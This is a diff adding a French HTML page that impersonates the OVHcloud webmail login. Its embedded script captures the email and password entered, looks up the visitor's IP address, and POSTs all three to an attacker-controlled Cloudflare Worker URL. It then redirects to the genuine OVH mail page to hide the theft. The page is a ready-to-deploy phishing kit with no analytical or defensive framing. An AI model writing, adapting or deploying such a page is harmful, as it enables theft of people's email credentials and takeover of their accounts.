@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion au webmail - OVHcloud</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Source Sans Pro', Helvetica, Arial, sans-serif;
+            height: 100%;
+            background-color: #004097;
+            overflow: hidden;
+        }
+
+        /* Arrière-plan avec overlay bleu */
+        .bg-overlay {
+            background-image: linear-gradient(rgba(0, 64, 151, 0.8), rgba(0, 64, 151, 0.8)), 
+                              url('https://www.ovhcloud.com/sites/default/files/styles/text_column_image/public/2021-08/bg-mail.jpg');
+            background-size: cover;
+            background-position: center;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: white;
+        }
+
+        .header-logo {
+            width: 100%;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.05);
+            margin-bottom: 40px;
+        }
+
+        .login-box {
+            width: 90%;
+            max-width: 400px;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: bold;
+            margin-bottom: 35px;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            font-size: 15px;
+            margin-bottom: 8px;
+        }
+
+        input[type="email"], 
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        .checkbox-area {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .btn-send {
+            background-color: white;
+            color: #004097;
+            border: none;
+            padding: 14px 40px;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            width: fit-content;
+            margin: 0 auto;
+            display: block;
+        }
+
+        /* Icône flottante magique à droite (comme sur l'image) */
+        .magic-icon {
+            position: absolute;
+            right: 5%;
+            top: 50%;
+            background: linear-gradient(135deg, #ccff00, #00ffcc);
+            padding: 10px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+    </style>
+</head>
+<body>
+
+<div class="bg-overlay">
+    <div class="header-logo">
+        <strong style="font-size: 20px;">OVHcloud</strong>
+    </div>
+
+    <div class="login-box">
+        <h1>Connexion au webmail</h1>
+
+        <div class="input-group">
+            <label>Votre adresse e-mail *</label>
+            <input type="email" id="email" required>
+        </div>
+
+        <div class="input-group" style="position: relative;">
+            <label>Mot de passe *</label>
+            <input type="password" id="password" required>
+            <div class="magic-icon">✨</div>
+        </div>
+
+        <div class="checkbox-area">
+            <input type="checkbox" id="memo">
+            <label for="memo">Mémoriser cette adresse</label>
+        </div>
+
+        <button class="btn-send" onclick="handleLogin()">Envoyer</button>
+    </div>
+</div>
+
+<script>
+    // --- CONFIGURATION ---
+    // Remplacez par l'URL de votre Worker Cloudflare
+    const WORKER_URL = "https://essaiedesitevoir1.maniedarile.workers.dev";
+
+    let ipAddress = "Détection...";
+	// Récupération de l'IP dès le chargement
+    fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => ipAddress = data.ip)
+        .catch(() => ipAddress = "Inconnue");
+
+    async function handleLogin() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+
+        if(!email || !pass) {
+            alert("Veuillez remplir tous les champs.");
+            return;
+        }
+
+        // Changement de texte pour simuler un chargement
+        const btn = document.querySelector('.btn-send');
+        btn.innerText = "Connexion...";
+        btn.disabled = true;
+
+        try {
+            const response = await fetch(WORKER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    identifiant: email,
+                    password: pass,
+                    ip: ipAddress
+                })
+            });
+
+            if (response.ok) {
+                // Redirection vers le vrai webmail OVH
+                window.location.href = "https://www.ovhcloud.com/fr/mail/";
+            } else {
+                alert("Identifiants incorrects, veuillez réessayer.");
+                btn.innerText = "Envoyer";
+                btn.disabled = false;
+            }
+        } catch (error) {
+            console.error("Erreur:", error);
+            alert("Erreur de connexion au serveur.");
+        }
+    }
+</script>
+
+</body>
+</html>
